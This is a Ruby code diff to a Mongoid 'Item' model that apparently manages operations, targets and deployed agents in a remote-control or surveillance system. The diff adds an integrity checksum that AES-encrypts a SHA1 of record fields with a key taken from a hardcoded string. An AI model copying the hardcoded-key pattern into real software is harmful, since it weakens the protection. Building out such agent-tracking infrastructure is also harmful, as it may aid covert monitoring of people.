@@ -1,7 +1,14 @@
+# encoding: utf-8
+
 require 'mongoid'
+
+# from RCS::Common
+require 'rcs-common/trace'
+require 'rcs-common/crypt'
 
 class Item
   extend RCS::Tracer
+  include RCS::Crypt
   include Mongoid::Document
   include Mongoid::Timestamps
 
@@ -32,6 +39,8 @@ class Item
   field :demo, type: Boolean
   field :upgradable, type: Boolean
 
+  field :cs, type: String
+  
   scope :operations, where(_kind: 'operation')
   scope :targets, where(_kind: 'target')
   scope :agents, where(_kind: 'agent')
@@ -52,6 +61,10 @@ class Item
 
   after_destroy :destroy_callback
 
+  before_create :do_checksum
+  before_update :do_checksum
+  before_save :do_checksum
+  
   public
   
   # performs global recalculation of stats (to be called periodically)
@@ -148,6 +161,22 @@ class Item
         RCS::DB::GridFS.delete_by_agent(self._id.to_s, self.path.last.to_s)
     end
   end
+
+  def do_checksum
+    self.cs = calculate_checksum
+  end
+
+  def calculate_checksum
+    # take the fields that are relevant and calculate the checksum on it
+    hash = [self._id, self.name, self.counter, self.status, self._kind, self.path]
+
+    if self._kind == 'agent'
+      hash << [self.instance, self.type, self.platform, self.deleted, self.uninstalled, self.demo, self.upgradable]
+    end
+
+    aes_encrypt(Digest::SHA1.digest(hash.inspect), Digest::SHA1.digest("∫∑x=1 ∆t")).unpack('H*').first
+  end
+
 end
 
 class FilesystemRequest
